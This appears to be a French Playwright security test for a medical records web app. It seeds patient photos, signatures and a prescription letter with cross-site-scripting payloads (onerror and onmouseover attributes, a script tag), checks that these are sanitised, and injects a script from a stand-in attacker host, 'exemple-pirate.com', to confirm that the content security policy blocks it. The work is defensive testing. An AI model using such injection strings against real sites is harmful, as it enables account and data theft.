import pathlib; __file__=str(pathlib.Path(__file__).resolve()); exec(open(pathlib.Path(__file__).parent/'base.py').read())
# Sécurité (étape 1.1, 11/10/2026, audit du 10/10) : une photo, une signature ou une ordonnance piégées (écrites directement dans
# la base, sans passer par l'écran) ne doivent rien exécuter ; l'application doit fonctionner avec la politique de sécurité (CSP)
# de firebase.json appliquée pour de bon (en ligne, elle est encore « Report-Only »).
ok_n = ko_n = 0
def ok(c, m, d=None):
    global ok_n, ko_n
    if c: ok_n += 1; print('  ✔ ' + m)
    else: ko_n += 1; print('  ✘ ' + m + ('' if d is None else ' ' + str(d)[:300]))

fj = json.load(open(ICI.parent / 'firebase.json'))
CSP = [h['value'] for r in fj['hosting']['headers'] for h in r['headers'] if h['key'].startswith('Content-Security-Policy')][0]
PIEGE = 'x" onerror="window.__xss=(window.__xss||0)+1'
HTML_PIEGE = '<p class="or-ti">COURRIER</p><p>Texte <img src=x onerror="window.__xss=(window.__xss||0)+10"><b onmouseover="window.__xss=99">gras</b></p><script>window.__xss=100</script>'
pid = [k.split('/')[-1] for k, v in S.items() if k.startswith(E + 'patients/') and len(v.get('lignesJson') or '') > 50][0]
S2 = json.loads(json.dumps(S))
S2[E + 'patients/' + pid]['identite']['photo'] = PIEGE
etab = S2[E + 'patients/' + pid].get('etablissementId') or 'HGC'
S2[E + 'consultations/XSS1'] = {'patientId': pid, 'etablissementId': etab, 'd': '2026-10-05', 'titre': 'Ordonnance', 'note': '', 'o': 1,
    'lignes': [{'id': 'LX1', 't': 'courrier', 'd': '2026-10-05', 'lib': 'Courrier piégé', 'par': 'MED', 'html': HTML_PIEGE, 'format': 'A4', 'taille': 0}],
    'creePar': 'MED', 'creeParNom': 'Dr Test'}
for k in [k for k in S2 if k.startswith('utilisateurs/')]:
    S2[k] = dict(S2[k], photo=PIEGE, signature=PIEGE)

S3 = json.loads(json.dumps(S))
S3[E+'membres/SEC'] = {"role": "assistante", "nom": "SEC", "email": "sec@test.ma", "actif": True, "tousEtablissements": True, "etablissements": ["HGC", "HCK", "CIOC"], "droits": {}}
S3['utilisateurs/SEC'] = {"nom": "SEC", "prenom": "Test"}

async def avec_csp(pg):
    msgs = []
    pg.on('console', lambda m: msgs.append(m.text) if 'Content Security Policy' in m.text or 'Refused to' in m.text else None)
    async def v2(route):
        r = await route.fetch(); h = dict(r.headers); h['content-security-policy'] = CSP
        await route.fulfill(response=r, headers=h)
    await pg.route(f'http://localhost:{PORT}/v2.html*', v2)
    return msgs

async def main():
    async with async_playwright() as p:
        b = await p.chromium.launch()
        print('1. Photo, signature et ordonnance piégées')
        pg = await ouvrir(b, S2); msgs = await avec_csp(pg); ev = pg.evaluate
        await pg.goto(f'http://localhost:{PORT}/v2.html#dossier/{pid}'); await pg.wait_for_timeout(2500)
        ok(await ev("!!document.querySelector('#page')"), 'dossier ouvert')
        ok(not await ev("[...document.querySelectorAll('img')].some(i=>i.getAttribute('onerror'))"), 'aucune image avec onerror dans la page')
        await pg.goto(f'http://localhost:{PORT}/v2.html#profil'); await pg.wait_for_timeout(1500)
        await ev(f"ordVoir('{pid}','XSS1','LX1')"); await pg.wait_for_timeout(900)
        await ev("window.anModifier && anModifier()"); await pg.wait_for_timeout(900)
        h = await ev("(document.getElementById('orPage')||{}).innerHTML||''")
        ok('gras' in h and 'onerror' not in h and 'onmouseover' not in h and '<script' not in h and '<img' not in h, 'courrier piégé : texte affiché, image, script et attributs retirés', h)
        await pg.mouse.move(400, 400); await pg.wait_for_timeout(300)
        ok(not await ev("window.__xss"), 'aucun code piégé exécuté', await ev("window.__xss"))
        ok(not pg.errs, 'aucune erreur JavaScript', pg.errs); await pg.close()

        print('2. Toute l\'application avec la politique de sécurité appliquée')
        for qui in ['MED', 'SEC']:
            pg = await ouvrir(b, S3); msgs = await avec_csp(pg); ev = pg.evaluate
            if qui != 'MED': await pg.add_init_script(f"window.__uid='{qui}'")
            for page in ['', '#agenda', '#salle', '#patients', f'#dossier/{pid}', '#taches', '#protocoles', '#parametres', '#bilan', '#profil']:
                await pg.goto(f'http://localhost:{PORT}/v2.html{page}'); await pg.wait_for_timeout(1500)
            await pg.goto(f'http://localhost:{PORT}/v2.html#dossier/{pid}'); await pg.reload(); await pg.wait_for_timeout(3000)
            await ev(f"window.ordCourriers && ordCourriers('{pid}')"); await pg.wait_for_timeout(1200)
            ok(not msgs, qui + ' : aucune action bloquée par la politique de sécurité', msgs[:5])
            ok(not pg.errs, qui + ' : aucune erreur JavaScript', pg.errs[:3]); await pg.close()
        pg = await ouvrir(b); msgs = await avec_csp(pg); ev = pg.evaluate
        await pg.goto(f'http://localhost:{PORT}/v2.html'); await pg.wait_for_timeout(1500)
        await ev("(()=>{const s=document.createElement('script');s.src='https://exemple-pirate.com/x.js';document.head.appendChild(s)})()"); await pg.wait_for_timeout(500)
        ok(any('exemple-pirate.com' in m for m in msgs), 'contrôle : un script d\'un autre site est bien refusé', msgs[:2]); await pg.close()
        await b.close()
    print(f'\n{ok_n} réussis, {ko_n} échoués')
asyncio.run(main())
